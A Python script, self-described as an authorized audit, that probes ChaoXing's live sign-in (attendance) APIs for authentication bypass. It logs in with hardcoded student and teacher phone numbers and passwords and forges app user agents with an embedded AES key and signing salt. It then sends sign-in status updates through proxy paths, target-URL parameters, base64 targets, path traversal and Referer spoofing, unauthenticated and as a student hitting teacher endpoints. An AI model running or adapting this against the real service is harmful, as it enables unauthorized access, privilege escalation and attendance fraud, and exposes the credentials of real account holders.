#!/usr/bin/env python3
"""
Tier 8 - Proxy/Special Path Authentication Bypass Test
Authorized Security Audit: ChaoXing Sign-in API Proxy Path Exploration
Focus: Authentication bypass through proxy paths
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ CONFIG ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

ACTIVE_ID = "5000163891319"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

# ============ AUTH FUNCTIONS ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def get_sign_params(uid):
    return {
        "activeId": ACTIVE_ID,
        "uid": uid,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "signType": "0",
        "clientType": "1",
    }

# ============ TEST FUNCTIONS ============
results = {}

def make_request(session, url, method="GET", params=None, data=None, json_data=None, headers_extra=None, timeout=15):
    """Make request and return (status_code, response_text, response_headers)"""
    try:
        h = {}
        if headers_extra:
            h.update(headers_extra)
        if method == "GET":
            r = session.get(url, params=params, timeout=timeout, allow_redirects=False, verify=False, headers=h)
        elif method == "POST":
            if json_data is not None:
                h.setdefault("Content-Type", "application/json")
                r = session.post(url, json=json_data, params=params, timeout=timeout, allow_redirects=False, verify=False, headers=h)
            else:
                r = session.post(url, data=data, params=params, timeout=timeout, allow_redirects=False, verify=False, headers=h)
        else:
            return None, None, None
        return r.status_code, r.text[:2000], dict(r.headers)
    except requests.exceptions.SSLError:
        return "SSL_ERROR", "", {}
    except requests.exceptions.ConnectTimeout:
        return "TIMEOUT", "", {}
    except requests.exceptions.ConnectionError as e:
        return f"CONN_ERROR: {str(e)[:100]}", "", {}
    except Exception as e:
        return f"ERROR: {str(e)[:100]}", "", {}

def test_url(session, url, label, method="GET", params=None, data=None, json_data=None, headers_extra=None):
    """Test a URL and record results"""
    status, text, hdrs = make_request(session, url, method=method, params=params, data=data, json_data=json_data, headers_extra=headers_extra)
    result = {
        "url": url,
        "method": method,
        "status": str(status),
        "response_preview": text[:500] if text else "",
        "content_type": hdrs.get("Content-Type", ""),
        "server": hdrs.get("Server", ""),
    }
    key = f"{label}"
    if key not in results:
        results[key] = []
    results[key].append(result)

    # Print inline
    status_str = str(status)
    interesting = status_str not in ("404", "TIMEOUT", "CONN_ERROR")
    marker = " ***" if interesting else ""
    print(f"  [{label}] {method} {url} => {status}{marker}")
    if interesting and text:
        preview = text[:200].replace('\n', ' ').replace('\r', '')
        print(f"    Response: {preview}")
    return result

# ============ MAIN ============
def main():
    print("=" * 80)
    print("TIER 8: Proxy/Special Path Authentication Bypass Test")
    print("=" * 80)

    # Step 1: Login
    print("\n[*] Logging in as student...")
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    Student PUID: {stu_puid}")

    print("[*] Logging in as teacher...")
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    Teacher PUID: {tea_puid}")

    # Create unauthenticated session
    noauth_session = requests.Session()
    noauth_session.verify = False
    noauth_session.headers.update({"User-Agent": get_mobile_ua()})

    # ============ SIGN-IN API PATHS TO TEST ============
    sign_api_paths = [
        "pptSign/updateSignStatus",
        "pptSign/updateSignStatusByUidsV2",
        "pptSign/refeashSignList4Json2",
        "pptSign/stuSignajax",
        "newsign/updateSignStatus",
        "widget/sign/pcTeaSignController/updateSignStatus2",
        "v2/apis/sign/signIn",
        "v2/apis/sign/updateSignStatus",
    ]

    # ============ PROXY/SPECIAL PATH DOMAINS ============
    proxy_configs = [
        # (label, base_url, path_prefix)
        ("noteyd_base", "https://noteyd.chaoxing.com", ""),
        ("noteyd_proxy", "https://noteyd.chaoxing.com/proxy", ""),
        ("noteyd_comm", "https://noteyd.chaoxing.com/comm", ""),
        ("noteyd_comp", "https://noteyd.chaoxing.com/comp", ""),
        ("appswh_epub", "https://appswh.chaoxing.com/epub", ""),
        ("appswh_board", "https://appswh.chaoxing.com/board", ""),
        ("appswh_projectapp", "https://appswh.chaoxing.com/projectapp", ""),
        ("appswh_hbqyg", "https://appswh.chaoxing.com/hbqyg", ""),
    ]

    # ============================================================
    # PHASE 1: Base path accessibility test
    # ============================================================
    print("\n" + "=" * 80)
    print("PHASE 1: Base Path Accessibility Test")
    print("=" * 80)

    for label, base_url, _ in proxy_configs:
        print(f"\n--- {label}: {base_url} ---")
        # Test with no auth
        test_url(noauth_session, base_url, f"{label}_noauth")
        # Test with student auth
        test_url(stu_session, base_url, f"{label}_student")
        # Test with teacher auth
        test_url(tea_session, base_url, f"{label}_teacher")

    # ============================================================
    # PHASE 2: Sign-in API paths through proxy (CRITICAL)
    # ============================================================
    print("\n" + "=" * 80)
    print("PHASE 2: Sign-in API Paths Through Proxy (CRITICAL)")
    print("=" * 80)

    for label, base_url, _ in proxy_configs:
        print(f"\n--- {label}: {base_url} ---")
        for api_path in sign_api_paths:
            full_url = f"{base_url}/{api_path}"
            # Test with student auth (POST with form data)
            sign_params = get_sign_params(stu_puid)
            test_url(stu_session, full_url, f"{label}_signapi_student",
                     method="POST", data=sign_params)
            # Test with no auth
            test_url(noauth_session, full_url, f"{label}_signapi_noauth",
                     method="POST", data=sign_params)

    # ============================================================
    # PHASE 3: Proxy URL parameter patterns (CRITICAL)
    # ============================================================
    print("\n" + "=" * 80)
    print("PHASE 3: Proxy URL Parameter Patterns (CRITICAL)")
    print("=" * 80)

    proxy_base = "https://noteyd.chaoxing.com/proxy"
    target_urls = [
        "mooc1-api.chaoxing.com/pptSign/updateSignStatus",
        "mooc1-api.chaoxing.com/newsign/updateSignStatus",
        "mooc1-1.chaoxing.com/pptSign/updateSignStatus",
        "mooc1-2.chaoxing.com/pptSign/updateSignStatus",
    ]

    # Pattern 1: ?target= parameter
    print("\n--- Pattern: ?target= parameter ---")
    for target in target_urls:
        for param_name in ["target", "url", "dest", "redirect", "proxy", "path", "api"]:
            url = f"{proxy_base}?{param_name}={target}"
            test_url(stu_session, url, f"proxy_param_{param_name}", method="POST",
                     data=get_sign_params(stu_puid))
            test_url(noauth_session, url, f"proxy_param_{param_name}_noauth", method="POST",
                     data=get_sign_params(stu_puid))

    # Pattern 2: Path-based proxy (URL in path)
    print("\n--- Pattern: URL in path ---")
    for target in target_urls:
        for proto in ["https://", "http://", ""]:
            url = f"{proxy_base}/{proto}{target}"
            test_url(stu_session, url, f"proxy_path_student", method="POST",
                     data=get_sign_params(stu_puid))

    # Pattern 3: Base64 encoded target
    print("\n--- Pattern: Base64 encoded target ---")
    for target in target_urls:
        for proto in ["https://", "http://"]:
            full_target = f"{proto}{target}"
            encoded = base64.b64encode(full_target.encode()).decode()
            url = f"{proxy_base}/{encoded}"
            test_url(stu_session, url, f"proxy_b64_student", method="POST",
                     data=get_sign_params(stu_puid))
            test_url(noauth_session, url, f"proxy_b64_noauth", method="POST",
                     data=get_sign_params(stu_puid))

    # ============================================================
    # PHASE 4: JSON Content-Type bypass test
    # ============================================================
    print("\n" + "=" * 80)
    print("PHASE 4: JSON Content-Type Bypass Test")
    print("=" * 80)

    for label, base_url, _ in proxy_configs:
        print(f"\n--- {label}: {base_url} ---")
        for api_path in sign_api_paths[:4]:  # Test key APIs only
            full_url = f"{base_url}/{api_path}"
            sign_params = get_sign_params(stu_puid)
            # POST with JSON content type
            test_url(stu_session, full_url, f"{label}_json_student",
                     method="POST", json_data=sign_params)
            # POST with JSON content type, no auth
            test_url(noauth_session, full_url, f"{label}_json_noauth",
                     method="POST", json_data=sign_params)

    # ============================================================
    # PHASE 5: Additional proxy path exploration
    # ============================================================
    print("\n" + "=" * 80)
    print("PHASE 5: Additional Proxy Path Exploration")
    print("=" * 80)

    # Test common proxy sub-paths
    additional_paths = [
        "api/pptSign/updateSignStatus",
        "api/v2/apis/sign/signIn",
        "sign/pptSign/updateSignStatus",
        "gateway/pptSign/updateSignStatus",
        "forward/pptSign/updateSignStatus",
        "proxy/pptSign/updateSignStatus",
        "mooc1-api/pptSign/updateSignStatus",
        "mooc/pptSign/updateSignStatus",
    ]

    for label, base_url, _ in proxy_configs:
        print(f"\n--- {label}: {base_url} ---")
        for api_path in additional_paths:
            full_url = f"{base_url}/{api_path}"
            sign_params = get_sign_params(stu_puid)
            test_url(stu_session, full_url, f"{label}_additional_student",
                     method="POST", data=sign_params)
            test_url(noauth_session, full_url, f"{label}_additional_noauth",
                     method="POST", data=sign_params)

    # ============================================================
    # PHASE 6: Teacher-specific API tests through proxy
    # ============================================================
    print("\n" + "=" * 80)
    print("PHASE 6: Teacher-specific API Tests Through Proxy")
    print("=" * 80)

    teacher_api_paths = [
        "pptSign/refeashSignList4Json2",
        "pptSign/updateSignStatusByUidsV2",
        "widget/sign/pcTeaSignController/updateSignStatus2",
    ]

    for label, base_url, _ in proxy_configs:
        print(f"\n--- {label}: {base_url} ---")
        for api_path in teacher_api_paths:
            full_url = f"{base_url}/{api_path}"
            # Teacher auth
            tea_params = get_sign_params(tea_puid)
            test_url(tea_session, full_url, f"{label}_teacher_api",
                     method="POST", data=tea_params)
            # Student trying teacher API (privilege escalation test)
            stu_params = get_sign_params(stu_puid)
            test_url(stu_session, full_url, f"{label}_stu_as_teacher",
                     method="POST", data=stu_params)
            # No auth
            test_url(noauth_session, full_url, f"{label}_teacher_noauth",
                     method="POST", data=tea_params)

    # ============================================================
    # PHASE 7: HTTP vs HTTPS and alternative domains
    # ============================================================
    print("\n" + "=" * 80)
    print("PHASE 7: HTTP vs HTTPS and Alternative Domains")
    print("=" * 80)

    alt_domains = [
        "http://noteyd.chaoxing.com/proxy",
        "http://noteyd.chaoxing.com/comm",
        "http://appswh.chaoxing.com/epub",
        "http://appswh.chaoxing.com/board",
    ]

    for base_url in alt_domains:
        print(f"\n--- {base_url} ---")
        test_url(stu_session, base_url, f"alt_base_student")
        for api_path in sign_api_paths[:3]:
            full_url = f"{base_url}/{api_path}"
            sign_params = get_sign_params(stu_puid)
            test_url(stu_session, full_url, f"alt_signapi_student",
                     method="POST", data=sign_params)

    # ============================================================
    # PHASE 8: Proxy path with specific query patterns
    # ============================================================
    print("\n" + "=" * 80)
    print("PHASE 8: Proxy Path Query Pattern Tests")
    print("=" * 80)

    query_patterns = [
        # Common proxy gateway patterns
        ("noteyd_proxy", "https://noteyd.chaoxing.com/proxy/pptSign/updateSignStatus?signType=0&clientType=1"),
        ("noteyd_proxy", "https://noteyd.chaoxing.com/proxy/pptSign/stuSignajax?activeId=5000163891319"),
        # With referer bypass attempts
        ("noteyd_proxy", "https://noteyd.chaoxing.com/proxy/pptSign/updateSignStatus"),
        ("noteyd_comm", "https://noteyd.chaoxing.com/comm/pptSign/updateSignStatus?signType=0"),
        ("noteyd_comp", "https://noteyd.chaoxing.com/comp/pptSign/updateSignStatus?signType=0"),
    ]

    for label, url in query_patterns:
        sign_params = get_sign_params(stu_puid)
        # With referer header
        test_url(stu_session, url, f"{label}_referer",
                 method="POST", data=sign_params,
                 headers_extra={"Referer": "https://mooc1.chaoxing.com/"})
        # Without auth
        test_url(noauth_session, url, f"{label}_referer_noauth",
                 method="POST", data=sign_params,
                 headers_extra={"Referer": "https://mooc1.chaoxing.com/"})

    # ============================================================
    # PHASE 9: Deep proxy path traversal
    # ============================================================
    print("\n" + "=" * 80)
    print("PHASE 9: Deep Proxy Path Traversal")
    print("=" * 80)

    traversal_paths = [
        "proxy/.. /pptSign/updateSignStatus",
        "proxy/..%2fpptSign/updateSignStatus",
        "proxy/%2e%2e/pptSign/updateSignStatus",
        "proxy/....//pptSign/updateSignStatus",
        "comm/..%2fpptSign/updateSignStatus",
        "comp/..%2fpptSign/updateSignStatus",
    ]

    for path in traversal_paths:
        url = f"https://noteyd.chaoxing.com/{path}"
        test_url(stu_session, url, f"traversal_student",
                 method="POST", data=get_sign_params(stu_puid))

    # ============================================================
    # SUMMARY
    # ============================================================
    print("\n" + "=" * 80)
    print("SUMMARY OF FINDINGS")
    print("=" * 80)

    # Categorize results
    interesting_findings = []
    accessible_paths = []
    auth_bypass_candidates = []
    api_responses = []

    for key, entries in results.items():
        for entry in entries:
            status = entry["status"]
            # Filter out uninteresting results
            if status in ("404", "TIMEOUT", "CONN_ERROR", "SSL_ERROR"):
                continue
            if status.startswith("ERROR"):
                continue

            accessible_paths.append(entry)

            # Check for auth bypass candidates
            if "noauth" in key and status not in ("302", "301", "401", "403"):
                auth_bypass_candidates.append(entry)

            # Check for API-like responses
            text = entry.get("response_preview", "")
            if any(kw in text.lower() for kw in ["result", "status", "sign", "success", "error", "data", "token", "uid"]):
                api_responses.append(entry)

            # Check for interesting non-404 responses
            if status in ("200", "201", "302", "301", "403", "401", "500", "502", "503"):
                interesting_findings.append(entry)

    print(f"\nTotal requests made: {sum(len(v) for v in results.values())}")
    print(f"Accessible (non-404/non-timeout): {len(accessible_paths)}")
    print(f"Auth bypass candidates: {len(auth_bypass_candidates)}")
    print(f"API-like responses: {len(api_responses)}")

    print("\n--- INTERESTING FINDINGS (non-404 responses) ---")
    for entry in interesting_findings:
        print(f"  [{entry['status']}] {entry['method']} {entry['url']}")
        if entry.get('response_preview'):
            preview = entry['response_preview'][:150].replace('\n', ' ')
            print(f"    Preview: {preview}")

    if auth_bypass_candidates:
        print("\n*** CRITICAL: AUTH BYPASS CANDIDATES ***")
        for entry in auth_bypass_candidates:
            print(f"  [{entry['status']}] {entry['method']} {entry['url']}")
            if entry.get('response_preview'):
                preview = entry['response_preview'][:200].replace('\n', ' ')
                print(f"    Preview: {preview}")

    if api_responses:
        print("\n--- API-LIKE RESPONSES ---")
        for entry in api_responses:
            print(f"  [{entry['status']}] {entry['method']} {entry['url']}")
            if entry.get('response_preview'):
                preview = entry['response_preview'][:200].replace('\n', ' ')
                print(f"    Preview: {preview}")

    # Group by domain
    print("\n--- FINDINGS BY DOMAIN ---")
    domain_summary = {}
    for key, entries in results.items():
        for entry in entries:
            status = entry["status"]
            if status in ("404", "TIMEOUT", "CONN_ERROR", "SSL_ERROR") or status.startswith("ERROR"):
                continue
            url = entry["url"]
            # Extract domain
            try:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                domain = parsed.netloc + parsed.path.split("/")[0] if parsed.path else parsed.netloc
            except:
                domain = "unknown"
            if domain not in domain_summary:
                domain_summary[domain] = {"accessible": 0, "statuses": set(), "samples": []}
            domain_summary[domain]["accessible"] += 1
            domain_summary[domain]["statuses"].add(str(status))
            if len(domain_summary[domain]["samples"]) < 3:
                domain_summary[domain]["samples"].append(entry)

    for domain, info in sorted(domain_summary.items()):
        print(f"\n  {domain}:")
        print(f"    Accessible endpoints: {info['accessible']}")
        print(f"    Status codes: {', '.join(sorted(info['statuses']))}")
        for s in info['samples']:
            print(f"    Sample: [{s['status']}] {s['url'][:100]}")

    # Save detailed results to JSON
    with open("/workspace/tier8_results.json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"\nDetailed results saved to /workspace/tier8_results.json")

if __name__ == "__main__":
    main()
